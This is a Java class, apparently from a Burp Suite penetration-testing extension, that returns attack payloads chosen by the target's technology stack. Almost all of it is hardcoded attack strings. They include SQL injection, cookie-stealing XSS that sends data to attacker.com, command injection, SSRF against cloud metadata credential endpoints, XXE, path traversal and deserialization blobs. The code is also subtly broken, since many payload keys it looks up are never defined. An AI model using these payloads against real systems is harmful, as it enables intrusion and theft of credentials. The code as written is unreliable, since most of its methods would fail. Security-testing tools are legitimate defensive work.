package com.secure.ai.burp.payload;

import com.secure.ai.burp.payload.PayloadGeneratorAgent.TechStackInfo;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

/**
 * IntelligentPayloadGenerator - Context-Aware Payload Generation Engine
 * 
 * Generates specialized payloads based on technology stack detection,
 * vulnerability type, and contextual analysis.
 */
public class IntelligentPayloadGenerator {
    
    private final Map<String, List<String>> payloadTemplates;
    private final Map<String, List<String>> encodingVariations;
    private final Map<String, List<String>> techSpecificPayloads;
    
    public IntelligentPayloadGenerator() {
        this.payloadTemplates = new HashMap<>();
        this.encodingVariations = new HashMap<>();
        this.techSpecificPayloads = new HashMap<>();
        
        initializePayloadTemplates();
        initializeEncodingVariations();
        initializeTechSpecificPayloads();
    }
    
    public List<String> generateSQLiPayloads(TechStackInfo techStack) {
        List<String> payloads = new ArrayList<>();
        
        // Base SQL injection payloads
        List<String> basePayloads = payloadTemplates.get("sqli_base");
        payloads.addAll(basePayloads);
        
        // Database-specific payloads
        if ("MySQL".equalsIgnoreCase(techStack.database)) {
            payloads.addAll(payloadTemplates.get("sqli_mysql"));
        } else if ("PostgreSQL".equalsIgnoreCase(techStack.database)) {
            payloads.addAll(payloadTemplates.get("sqli_postgresql"));
        } else if ("Oracle".equalsIgnoreCase(techStack.database)) {
            payloads.addAll(payloadTemplates.get("sqli_oracle"));
        } else if ("SQLServer".equalsIgnoreCase(techStack.database)) {
            payloads.addAll(payloadTemplates.get("sqli_sqlserver"));
        }
        
        // Language-specific adaptations
        if ("PHP".equalsIgnoreCase(techStack.language)) {
            payloads.addAll(techSpecificPayloads.get("php_sqli"));
        } else if ("Java".equalsIgnoreCase(techStack.language)) {
            payloads.addAll(techSpecificPayloads.get("java_sqli"));
        } else if (techStack.framework != null && techStack.framework.toLowerCase().contains("asp.net")) {
            payloads.addAll(techSpecificPayloads.get("aspnet_sqli"));
        }
        
        return optimizePayloads(payloads, 15);
    }
    
    public List<String> generateXSSPayloads(TechStackInfo techStack) {
        List<String> payloads = new ArrayList<>();
        
        // Base XSS payloads
        payloads.addAll(payloadTemplates.get("xss_base"));
        
        // Context-specific XSS
        payloads.addAll(payloadTemplates.get("xss_dom"));
        payloads.addAll(payloadTemplates.get("xss_stored"));
        payloads.addAll(payloadTemplates.get("xss_reflected"));
        
        // Framework-specific XSS
        if (techStack.framework != null) {
            if (techStack.framework.toLowerCase().contains("react")) {
                payloads.addAll(techSpecificPayloads.get("react_xss"));
            } else if (techStack.framework.toLowerCase().contains("angular")) {
                payloads.addAll(techSpecificPayloads.get("angular_xss"));
            } else if (techStack.framework.toLowerCase().contains("vue")) {
                payloads.addAll(techSpecificPayloads.get("vue_xss"));
            }
        }
        
        return optimizePayloads(payloads, 20);
    }
    
    public List<String> generateRCEPayloads(TechStackInfo techStack) {
        List<String> payloads = new ArrayList<>();
        
        // Base RCE payloads
        payloads.addAll(payloadTemplates.get("rce_base"));
        
        // OS-specific payloads
        if ("Windows".equalsIgnoreCase(techStack.operatingSystem)) {
            payloads.addAll(payloadTemplates.get("rce_windows"));
        } else {
            payloads.addAll(payloadTemplates.get("rce_unix"));
        }
        
        // Language-specific RCE
        if ("PHP".equalsIgnoreCase(techStack.language)) {
            payloads.addAll(techSpecificPayloads.get("php_rce"));
        } else if ("Python".equalsIgnoreCase(techStack.language)) {
            payloads.addAll(techSpecificPayloads.get("python_rce"));
        } else if ("Java".equalsIgnoreCase(techStack.language)) {
            payloads.addAll(techSpecificPayloads.get("java_rce"));
        }
        
        return optimizePayloads(payloads, 12);
    }
    
    public List<String> generateSSRFPayloads(TechStackInfo techStack) {
        List<String> payloads = new ArrayList<>();
        
        // Base SSRF payloads
        payloads.addAll(payloadTemplates.get("ssrf_base"));
        
        // Cloud-specific SSRF
        payloads.addAll(payloadTemplates.get("ssrf_aws"));
        payloads.addAll(payloadTemplates.get("ssrf_gcp"));
        payloads.addAll(payloadTemplates.get("ssrf_azure"));
        
        // Internal service discovery
        payloads.addAll(payloadTemplates.get("ssrf_internal"));
        
        return optimizePayloads(payloads, 15);
    }
    
    public List<String> generateXXEPayloads(TechStackInfo techStack) {
        List<String> payloads = new ArrayList<>();
        
        // Base XXE payloads
        payloads.addAll(payloadTemplates.get("xxe_base"));
        
        // XXE with external entities
        payloads.addAll(payloadTemplates.get("xxe_external"));
        
        // XXE for file disclosure
        payloads.addAll(payloadTemplates.get("xxe_file_disclosure"));
        
        // XXE for SSRF
        payloads.addAll(payloadTemplates.get("xxe_ssrf"));
        
        return optimizePayloads(payloads, 10);
    }
    
    public List<String> generateCSRFPayloads(TechStackInfo techStack) {
        List<String> payloads = new ArrayList<>();
        
        // Base CSRF payloads
        payloads.addAll(payloadTemplates.get("csrf_base"));
        
        // Framework-specific CSRF bypasses
        if (techStack.framework != null) {
            String framework = techStack.framework.toLowerCase();
            if (framework.contains("django")) {
                payloads.addAll(techSpecificPayloads.get("django_csrf"));
            } else if (framework.contains("rails")) {
                payloads.addAll(techSpecificPayloads.get("rails_csrf"));
            } else if (framework.contains("laravel")) {
                payloads.addAll(techSpecificPayloads.get("laravel_csrf"));
            }
        }
        
        return optimizePayloads(payloads, 8);
    }
    
    public List<String> generateLFIPayloads(TechStackInfo techStack) {
        List<String> payloads = new ArrayList<>();
        
        // Base LFI payloads
        payloads.addAll(payloadTemplates.get("lfi_base"));
        
        // OS-specific LFI
        if ("Windows".equalsIgnoreCase(techStack.operatingSystem)) {
            payloads.addAll(payloadTemplates.get("lfi_windows"));
        } else {
            payloads.addAll(payloadTemplates.get("lfi_unix"));
        }
        
        // Web server specific logs
        if ("Apache".equalsIgnoreCase(techStack.webServer)) {
            payloads.addAll(payloadTemplates.get("lfi_apache_logs"));
        } else if ("Nginx".equalsIgnoreCase(techStack.webServer)) {
            payloads.addAll(payloadTemplates.get("lfi_nginx_logs"));
        }
        
        return optimizePayloads(payloads, 12);
    }
    
    public List<String> generateIDORPayloads(TechStackInfo techStack) {
        List<String> payloads = new ArrayList<>();
        
        // Base IDOR payloads
        payloads.addAll(payloadTemplates.get("idor_base"));
        
        // Numeric IDOR variations
        payloads.addAll(payloadTemplates.get("idor_numeric"));
        
        // UUID IDOR variations
        payloads.addAll(payloadTemplates.get("idor_uuid"));
        
        // Base64 encoded IDOR
        payloads.addAll(payloadTemplates.get("idor_base64"));
        
        return optimizePayloads(payloads, 10);
    }
    
    public List<String> generateDeserializationPayloads(TechStackInfo techStack) {
        List<String> payloads = new ArrayList<>();
        
        // Language-specific deserialization
        if ("Java".equalsIgnoreCase(techStack.language)) {
            payloads.addAll(techSpecificPayloads.get("java_deserialization"));
        } else if ("Python".equalsIgnoreCase(techStack.language)) {
            payloads.addAll(techSpecificPayloads.get("python_deserialization"));
        } else if ("PHP".equalsIgnoreCase(techStack.language)) {
            payloads.addAll(techSpecificPayloads.get("php_deserialization"));
        } else if (".NET".equalsIgnoreCase(techStack.framework)) {
            payloads.addAll(techSpecificPayloads.get("dotnet_deserialization"));
        }
        
        return optimizePayloads(payloads, 8);
    }
    
    public List<String> generateBusinessLogicPayloads(TechStackInfo techStack) {
        List<String> payloads = new ArrayList<>();
        
        // Base business logic bypass payloads
        payloads.addAll(payloadTemplates.get("business_logic_base"));
        
        // Authentication bypass
        payloads.addAll(payloadTemplates.get("auth_bypass"));
        
        // Authorization bypass
        payloads.addAll(payloadTemplates.get("authz_bypass"));
        
        // Race condition payloads
        payloads.addAll(payloadTemplates.get("race_condition"));
        
        // Price manipulation
        payloads.addAll(payloadTemplates.get("price_manipulation"));
        
        return optimizePayloads(payloads, 12);
    }
    
    private List<String> optimizePayloads(List<String> payloads, int maxCount) {
        if (payloads.size() <= maxCount) {
            return payloads;
        }
        
        // Shuffle and select top payloads
        List<String> shuffled = new ArrayList<>(payloads);
        Collections.shuffle(shuffled, ThreadLocalRandom.current());
        
        return shuffled.subList(0, maxCount);
    }
    
    private void initializePayloadTemplates() {
        // SQL Injection Payloads
        payloadTemplates.put("sqli_base", Arrays.asList(
            "' OR 1=1 -- ",
            "' OR 'a'='a",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL,NULL,NULL --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            "' OR SLEEP(5) --",
            "' OR BENCHMARK(5000000,MD5('test')) --"
        ));
        
        payloadTemplates.put("sqli_mysql", Arrays.asList(
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
            "' OR (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL --",
            "' UNION SELECT user(),database(),version() --",
            "' AND (SELECT COUNT(*) FROM mysql.user) > 0 --"
        ));
        
        payloadTemplates.put("sqli_postgresql", Arrays.asList(
            "'; SELECT version(); --",
            "' OR (SELECT current_user) IS NOT NULL --",
            "' UNION SELECT NULL,current_database(),version() --",
            "' AND (SELECT COUNT(*) FROM pg_tables) > 0 --"
        ));
        
        payloadTemplates.put("sqli_oracle", Arrays.asList(
            "' OR (SELECT user FROM dual) IS NOT NULL --",
            "' UNION SELECT NULL,user,version FROM v$version --",
            "' AND (SELECT COUNT(*) FROM all_tables) > 0 --"
        ));
        
        payloadTemplates.put("sqli_sqlserver", Arrays.asList(
            "'; EXEC xp_cmdshell('whoami'); --",
            "' OR (SELECT @@version) IS NOT NULL --",
            "' UNION SELECT NULL,user_name(),@@version --",
            "' AND (SELECT COUNT(*) FROM sys.tables) > 0 --"
        ));
        
        // XSS Payloads
        payloadTemplates.put("xss_base", Arrays.asList(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<input type=image src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>"
        ));
        
        payloadTemplates.put("xss_dom", Arrays.asList(
            "#<script>alert('DOM-XSS')</script>",
            "javascript:alert(document.domain)",
            "<img src=# onerror=alert(document.cookie)>",
            "<svg onload=alert(localStorage.getItem('token'))>"
        ));
        
        payloadTemplates.put("xss_stored", Arrays.asList(
            "<script>fetch('/api/users').then(r=>r.json()).then(console.log)</script>",
            "<img src=x onerror=this.src='//attacker.com/?'+document.cookie>",
            "<script>document.location='//attacker.com/?'+document.cookie</script>"
        ));
        
        payloadTemplates.put("xss_reflected", Arrays.asList(
            "\"><script>alert('Reflected-XSS')</script>",
            "'><img src=x onerror=alert('XSS')>",
            "</script><script>alert('XSS')</script>",
            "';alert('XSS');//"
        ));
        
        // RCE Payloads
        payloadTemplates.put("rce_base", Arrays.asList(
            "; id",
            "| whoami",
            "`id`",
            "$(whoami)",
            "&& dir",
            "; cat /etc/passwd",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts"
        ));
        
        payloadTemplates.put("rce_unix", Arrays.asList(
            "; cat /etc/passwd",
            "| ls -la /",
            "`cat /proc/version`",
            "$(uname -a)",
            "; ps aux",
            "| netstat -tulpn",
            "; find / -name '*.log' 2>/dev/null"
        ));
        
        payloadTemplates.put("rce_windows", Arrays.asList(
            "& dir C:\\",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "& whoami",
            "| net user",
            "& ipconfig /all",
            "| tasklist",
            "& systeminfo"
        ));
        
        // SSRF Payloads
        payloadTemplates.put("ssrf_base", Arrays.asList(
            "http://localhost:80",
            "http://127.0.0.1:22",
            "http://0.0.0.0:3000",
            "http://[::1]:80",
            "file:///etc/passwd",
            "gopher://127.0.0.1:25/",
            "dict://localhost:11211/"
        ));
        
        payloadTemplates.put("ssrf_aws", Arrays.asList(
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document"
        ));
        
        payloadTemplates.put("ssrf_gcp", Arrays.asList(
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        ));
        
        payloadTemplates.put("ssrf_azure", Arrays.asList(
            "http://169.254.169.254/metadata/instance?api-version=2017-04-02",
            "http://169.254.169.254/metadata/identity/oauth2/token"
        ));
        
        // XXE Payloads
        payloadTemplates.put("xxe_base", Arrays.asList(
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://attacker.com/'>]><root>&test;</root>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;]>"
        ));
        
        // More payload templates...
        initializeAdditionalTemplates();
    }
    
    private void initializeAdditionalTemplates() {
        // CSRF Payloads
        payloadTemplates.put("csrf_base", Arrays.asList(
            "<form action='/admin/delete' method='post'><input type='hidden' name='id' value='1'></form><script>document.forms[0].submit()</script>",
            "<img src='/admin/delete?id=1' width='1' height='1'>",
            "<iframe src='/admin/delete?id=1' width='1' height='1'></iframe>"
        ));
        
        // LFI Payloads
        payloadTemplates.put("lfi_base", Arrays.asList(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
        ));
        
        // IDOR Payloads
        payloadTemplates.put("idor_base", Arrays.asList(
            "../user/2",
            "../../admin/1",
            "/api/user/1337",
            "?user_id=1"
        ));
        
        payloadTemplates.put("idor_numeric", Arrays.asList(
            "1", "2", "3", "100", "1000", "-1", "0"
        ));
        
        // Business Logic Payloads
        payloadTemplates.put("business_logic_base", Arrays.asList(
            "amount=-100",
            "quantity=-5",
            "price=0.01",
            "user_id=admin",
            "role=administrator"
        ));
        
        payloadTemplates.put("auth_bypass", Arrays.asList(
            "admin'--",
            "' OR '1'='1",
            "admin' OR 1=1--",
            "' OR 1=1#"
        ));
    }
    
    private void initializeEncodingVariations() {
        encodingVariations.put("url", Arrays.asList(
            "%3C", "%3E", "%22", "%27", "%20"
        ));
        
        encodingVariations.put("html", Arrays.asList(
            "&lt;", "&gt;", "&quot;", "&apos;", "&amp;"
        ));
        
        encodingVariations.put("unicode", Arrays.asList(
            "\\u003c", "\\u003e", "\\u0022", "\\u0027"
        ));
    }
    
    private void initializeTechSpecificPayloads() {
        // PHP-specific payloads
        techSpecificPayloads.put("php_sqli", Arrays.asList(
            "'; system('id'); --",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
            "' OR (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL --"
        ));
        
        techSpecificPayloads.put("php_rce", Arrays.asList(
            "; system('id');",
            "; exec('whoami');",
            "; shell_exec('ls -la');",
            "; passthru('cat /etc/passwd');"
        ));
        
        // Java-specific payloads
        techSpecificPayloads.put("java_sqli", Arrays.asList(
            "'; SELECT * FROM users WHERE '1'='1",
            "' UNION SELECT NULL FROM INFORMATION_SCHEMA.TABLES --",
            "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) > 0 --"
        ));
        
        techSpecificPayloads.put("java_deserialization", Arrays.asList(
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckwABmZhY3RvcnQAKUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvdHJheC9UZW1wbGF0ZXNJbXBsOwAAAQ==",
            "aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c00066d656d62657274003a4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b"
        ));
        
        // React-specific XSS
        techSpecificPayloads.put("react_xss", Arrays.asList(
            "{alert('XSS')}",
            "javascript:alert('XSS')",
            "<img src=x onerror={alert('XSS')} />",
            "onLoad={alert('XSS')}"
        ));
    }
}